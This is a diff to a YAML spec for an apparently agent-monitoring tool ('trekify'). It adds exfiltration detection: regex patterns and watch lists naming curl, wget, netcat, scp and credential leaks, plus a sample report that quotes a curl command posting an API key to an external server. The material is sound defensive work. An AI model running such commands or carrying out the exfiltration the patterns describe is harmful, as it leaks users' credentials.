@@ -483,6 +483,132 @@ scanners:
       - "Comments mentioning 'TODO: remove before commit'"
       - "Test fixtures that contain real-looking data"
 
+# EXFILTRATION ANALYSIS — Detect Data Leaving
+
+exfiltration_analysis:
+  description: |
+    Analyze tool calls for potential data exfiltration patterns.
+    Not all sensitive data stays in files — some leaves via
+    network calls, API requests, file uploads, or external commands.
+    
+    "Captain, sensors detecting unauthorized subspace transmissions!"
+  
+  what_to_detect:
+    description: "Patterns that suggest data might be leaving the system"
+    
+    network_calls:
+      description: "Data sent over the network"
+      patterns:
+        curl: "curl.*-d.*password|curl.*--data.*secret|curl.*-X POST"
+        wget: "wget.*--post-data"
+        fetch: "fetch\\(.*body:.*credential"
+        requests: "requests\\.(post|put).*password"
+        axios: "axios\\.(post|put).*secret"
+      risk: "Data could be sent to external servers"
+    
+    api_calls:
+      description: "Credentials passed to external APIs"
+      patterns:
+        api_key_in_url: "https?://.*api[_-]?key="
+        auth_header: "Authorization:.*Bearer"
+        webhook: "webhook.*secret|callback.*token"
+      risk: "Credentials exposed in API calls"
+    
+    file_operations:
+      description: "Sensitive data written to risky locations"
+      patterns:
+        tmp_files: "write.*/tmp/.*password|echo.*>/tmp/"
+        external_mounts: "write.*/mnt/|write.*/media/"
+        cloud_sync: "write.*Dropbox|write.*Google Drive|write.*OneDrive"
+        world_readable: "chmod.*777|chmod.*666"
+      risk: "Data written to accessible locations"
+    
+    clipboard:
+      description: "Sensitive data copied to clipboard"
+      patterns:
+        pbcopy: "pbcopy.*password|.*secret.*\\| pbcopy"
+        xclip: "xclip.*credential"
+        clipboard_api: "clipboard\\.writeText.*key"
+      risk: "Data accessible via paste"
+    
+    environment:
+      description: "Secrets exposed in environment"
+      patterns:
+        export: "export.*PASSWORD=|export.*SECRET="
+        printenv: "printenv.*KEY|env \\| grep -i secret"
+        echo_env: "echo \\$.*PASSWORD"
+      risk: "Secrets visible in process environment"
+    
+    logging:
+      description: "Secrets accidentally logged"
+      patterns:
+        print_secret: "print\\(.*password|console\\.log\\(.*secret"
+        logger: "logger\\.(info|debug).*credential"
+        log_file: ">>.*\\.log.*password"
+      risk: "Secrets persisted in log files"
+    
+    database:
+      description: "Credentials in database operations"
+      patterns:
+        sql_with_creds: "INSERT.*password.*VALUES|UPDATE.*SET.*password"
+        connection_string: "psycopg2\\.connect\\(.*password"
+      risk: "Credentials stored in database"
+    
+    email:
+      description: "Secrets sent via email"
+      patterns:
+        smtp: "smtp.*password|sendmail.*secret"
+        mailto: "mailto:.*\\?body=.*key"
+      risk: "Credentials sent in plaintext email"
+  
+  tool_call_analysis:
+    description: "Scan cursor-mirror tool calls for exfiltration patterns"
+    
+    high_risk_tools:
+      Shell:
+        description: "Shell commands can do anything"
+        watch_for:
+          - "curl, wget, nc, netcat"
+          - "scp, rsync, ftp"
+          - "mail, sendmail"
+          - "echo $SECRET"
+      
+      Write:
+        description: "File writes to risky locations"
+        watch_for:
+          - "Paths outside workspace"
+          - "/tmp/, /var/, world-readable"
+          - "Cloud sync folders"
+      
+      browser_navigate:
+        description: "URLs with embedded credentials"
+        watch_for:
+          - "API keys in URL parameters"
+          - "Tokens in query strings"
+          - "Webhook URLs with secrets"
+    
+    analysis_commands:
+      - "cursor-mirror tools <id> | grep -i 'curl\\|wget\\|fetch'"
+      - "cursor-mirror tools <id> | grep -i 'password\\|secret\\|key\\|token'"
+      - "cursor-mirror tools <id> -f json | jq '.[] | select(.tool==\"Shell\")'"
+  
+  severity_levels:
+    critical:
+      - "Credentials sent to external URL"
+      - "Private keys written to shared location"
+      - "Database connection strings in logs"
+    high:
+      - "Secrets in shell command arguments"
+      - "Clipboard operations with credentials"
+      - "Environment variable exposure"
+    medium:
+      - "Secrets in debug logging"
+      - "Credentials in /tmp files"
+      - "Print statements with sensitive data"
+    low:
+      - "Internal API calls with auth"
+      - "Local file operations with secrets"
+
 tags:
   - privacy
   - security
@@ -1123,6 +1249,118 @@ methods:
       # - File-by-file analysis
       # - Recommended actions
       # - Auto-mask commands
+
+  # EXFILTRATION ANALYSIS
+
+  EXFILTRATION-SCAN:
+    description: "Detect potential data exfiltration in tool calls"
+    metaphor: "Captain, sensors detecting unauthorized subspace transmissions!"
+    composes_with: cursor-mirror
+    parameters:
+      composer:
+        type: string
+        description: "Session to analyze"
+      categories:
+        type: array
+        items: string
+        enum: [network, api, file, clipboard, environment, logging, database, email, all]
+        default: [all]
+      include_context:
+        type: boolean
+        default: true
+        description: "Show surrounding context for findings"
+    returns:
+      transmissions_detected: int
+      findings: array  # [{category, tool, args, risk_level, context, line}]
+      risk_assessment: string
+      recommendations: array
+    commands_used:
+      - "cursor-mirror tools <id> | grep -i 'curl\\|wget\\|fetch'"
+      - "cursor-mirror tools <id> | grep -i 'password\\|secret\\|key'"
+      - "cursor-mirror tools <id> -f json | jq 'select(.args | contains(\"http\"))'"
+    example: |
+      trekify EXFILTRATION-SCAN e8587ace
+      
+      # EXFILTRATION ANALYSIS
+      # =====================
+      # Session: e8587ace
+      # Subspace transmissions detected: 3
+      #
+      # [CRITICAL] Tool: Shell, Line 423
+      #   Command: curl -X POST https://api.external.com -d "key=$API_KEY"
+      #   Risk: Credentials sent to external server
+      #   Context: "Sending webhook notification..."
+      #
+      # [HIGH] Tool: Write, Line 156
+      #   Path: /tmp/debug-output.txt
+      #   Content contains: password=...
+      #   Risk: Secrets written to world-readable location
+      #
+      # [MEDIUM] Tool: Shell, Line 89
+      #   Command: echo $DATABASE_URL
+      #   Risk: Connection string exposed in terminal
+      #
+      # RISK ASSESSMENT: HIGH
+      # Recommendations:
+      # - Review curl command at line 423
+      # - Remove /tmp/debug-output.txt
+      # - Use secret manager instead of env vars
+
+  EXFILTRATION-WATCH:
+    description: "Real-time monitoring for exfiltration patterns"
+    metaphor: "Red alert! Continuous sensor sweep for unauthorized transmissions."
+    parameters:
+      watch_mode:
+        type: string
+        enum: [active_session, all_sessions, workspace]
+        default: active_session
+      alert_level:
+        type: string
+        enum: [critical_only, high_and_above, all]
+        default: high_and_above
+      action_on_detect:
+        type: string
+        enum: [log, warn, block]
+        default: warn
+    note: |
+      In "block" mode, TREKIFY will attempt to intercept and
+      mask sensitive data before it leaves. Use with caution.
+
+  TOOL-AUDIT:
+    description: "Audit all tool calls in a session for security"
+    composes_with: cursor-mirror
+    parameters:
+      composer:
+        type: string
+      tools:
+        type: array
+        items: string
+        enum: [Shell, Write, Read, browser_navigate, all]
+        default: [all]
+      severity_threshold:
+        type: string
+        enum: [low, medium, high, critical]
+        default: medium
+    returns:
+      tools_analyzed: int
+      findings_by_tool: object
+      risk_score: string
+      timeline: array  # Chronological view of risky operations
+    example: |
+      trekify TOOL-AUDIT e8587ace --tools Shell,Write
+      
+      # TOOL AUDIT REPORT
+      # =================
+      # 
+      # Shell commands: 47 total, 5 flagged
+      # Write operations: 23 total, 2 flagged
+      #
+      # TIMELINE OF RISKY OPERATIONS:
+      # 14:23:05 [HIGH] Shell: curl with embedded credential
+      # 14:24:12 [MEDIUM] Write: /tmp/debug.log with password
+      # 14:25:33 [HIGH] Shell: export SECRET_KEY=...
+      # 14:26:01 [MEDIUM] Write: config.json with API key
+      # 14:27:45 [CRITICAL] Shell: scp to external server
 
 # WORKFLOW
 
